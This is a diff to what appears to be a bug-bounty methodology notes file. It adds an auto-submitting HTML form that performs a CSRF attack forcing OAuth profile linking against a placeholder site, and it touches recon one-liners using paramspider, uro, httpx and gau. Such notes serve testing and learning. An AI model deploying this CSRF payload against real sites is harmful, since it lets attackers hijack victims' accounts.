@@ -474,7 +474,17 @@ Host: site.com
 Vulnerability Forced OAuth profile linking
   
 -> CSRF
-  
+```
+<html>
+	<body>
+      	<form action="http://site.com/callback?code=<code>" method="GET">
+		</form> 
+	</body>
+	<script>
+		document.forms[0].submit();
+	</script>
+</html>
+```  
 /codes/csrf/csrf_oauth.html
   
 Vulnerability Code Stealing
@@ -1081,14 +1091,14 @@ https://github.com/SamJoan/droopescan
 
 3.2 -> paramspider + uro + httpx
 
-`cat checked_subdomains.txt | xargs -n 1 python paramspider.py -o paramspider.txt -d`
+`cat checked_subdomains.txt | xargs -n 1 python paramspider.py -o paramspider.txt -d`  
 `cat paramspider.txt | uro | httpx -fc 404 -o paramspider_final.txt`
 
 #### 4 - Files Discovery
 
 4.1 -> gau+grep+httpx
 
-`cat gau_urls.txt | grep "\.js" | httpx -fc 404 -o js_files.txt`
+`cat gau_urls.txt | grep "\.js" | httpx -fc 404 -o js_files.txt`  
 
 -> Used Tools
 
